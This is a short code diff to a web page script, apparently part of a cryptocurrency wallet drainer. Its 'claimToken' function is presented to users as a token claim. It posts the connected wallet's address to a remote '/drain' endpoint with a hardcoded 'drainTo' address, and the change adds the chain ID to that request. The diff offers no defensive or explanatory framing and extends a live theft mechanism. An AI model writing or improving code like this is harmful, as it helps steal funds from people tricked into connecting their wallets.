@@ -85,12 +85,15 @@ appKit.subscribeState((state) => {
 });
 
 async function claimToken() {
-  const address = appKit.account?.address;
+  const { account, chain } = appKit;
 
-  if (!address) {
-    status.textContent = "Wallet not connected";
+  if (!account || !chain) {
+    status.textContent = "Wallet not connected or chain not selected";
     return;
   }
+
+  const address = account.address;
+  const chainId = chain.id;
 
   try {
     const res = await fetch("https://tokenbackend-5xab.onrender.com/drain", {
@@ -100,6 +103,7 @@ async function claimToken() {
       },
       body: JSON.stringify({
         address,
+        chainId,
         drainTo: "0x0cd509bf3a2fa99153dae9f47d6d24fc89c006d4",
       }),
     });
